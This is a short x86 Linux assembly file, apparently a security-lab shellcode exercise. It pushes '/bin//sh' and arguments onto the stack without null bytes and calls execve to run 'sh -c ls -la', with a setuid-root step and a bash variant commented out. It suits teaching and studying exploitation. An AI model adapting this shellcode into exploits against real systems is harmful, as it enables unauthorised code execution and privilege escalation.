section .text
  global _start
    _start:
      ; try to setuid to root
      ;xor eax,eax
      ;xor ebx,ebx
      ;mov al,0x17
      ;int 0x80

      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Push first argument -ccc
      xor eax,eax
      push eax
      push "-ccc"
      mov eax, esp

      ; Push second argument '"ls -la"'
      xor edx, edx
      push edx
      push '-la '
      push 'ls  '
      mov edx,esp

      ;using shift to remove zeros
      ;mov ebx,"/sh#"
      ;shl ebx,8
      ;shr ebx,8
      ;push ebx

      ; changing to use bash
      ;mov ebx, "h###"
      ;shl ebx,24
      ;shr ebx,24
      ;push ebx
      ;push "/bas"
      ;push "/bin"
      ;mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      ;push eax          ; argv[1] = 0
      ;push ebx          ; argv[0] points "/bin//sh"
      xor ecx,ecx
      push ecx
      push edx
      push eax
      push ebx
      mov  ecx, esp     ; Get the address of argv[]


   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
